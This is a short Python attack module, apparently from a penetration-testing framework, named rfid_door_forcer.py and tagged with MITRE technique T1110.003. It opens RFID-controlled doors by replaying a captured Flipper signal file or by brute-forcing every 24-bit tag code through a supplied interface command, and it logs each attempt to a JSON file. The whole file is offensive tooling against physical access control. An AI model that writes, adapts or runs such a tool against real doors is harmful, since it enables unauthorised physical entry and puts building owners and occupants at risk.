#!/usr/bin/env python3
# modules/attacks/rfid_door_forcer.py

import argparse
import time
import json
import os
from datetime import datetime
from subprocess import run

LOG_FILE = "results/rfid_force_log.json"
MITRE_TTP = "T1110.003"

def log_attempt(method, success, tag=None):
    os.makedirs("results", exist_ok=True)
    entry = {
        "timestamp": datetime.utcnow().isoformat(),
        "method": method,
        "success": success,
        "tag": tag,
        "ttp": MITRE_TTP
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def replay_tag(file):
    print(f"[*] Replaying RFID signal from {file}")
    result = run(["flipper-send", file], capture_output=True)
    log_attempt("replay", result.returncode == 0, tag=file)

def brute_force(interface, delay):
    for code in range(0x000000, 0xFFFFFF):
        tag = f"{code:06X}"
        print(f"[*] Trying tag {tag}")
        result = run([interface, tag])
        log_attempt("brute-force", result.returncode == 0, tag=tag)
        time.sleep(delay)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="RFID door brute-force or replay tool")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("--replay", help="Path to Flipper .sub file for replay")
    group.add_argument("--brute", help="RFID interface command for brute-force")
    parser.add_argument("--delay", type=float, default=0.1, help="Delay between brute attempts")
    args = parser.parse_args()

    if args.replay:
        replay_tag(args.replay)
    elif args.brute:
        brute_force(args.brute, args.delay)
